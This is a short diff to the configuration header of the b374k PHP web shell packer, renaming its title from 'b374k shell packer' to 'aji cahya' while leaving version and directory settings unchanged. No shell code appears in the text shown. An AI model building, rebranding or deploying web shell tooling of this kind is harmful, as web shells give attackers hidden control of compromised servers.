@@ -6,7 +6,7 @@
 	https://github.com/b374k/b374k
 
 */
-$GLOBALS['packer']['title'] = "b374k shell packer";
+$GLOBALS['packer']['title'] = "aji cahya";
 $GLOBALS['packer']['version'] = "0.4.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
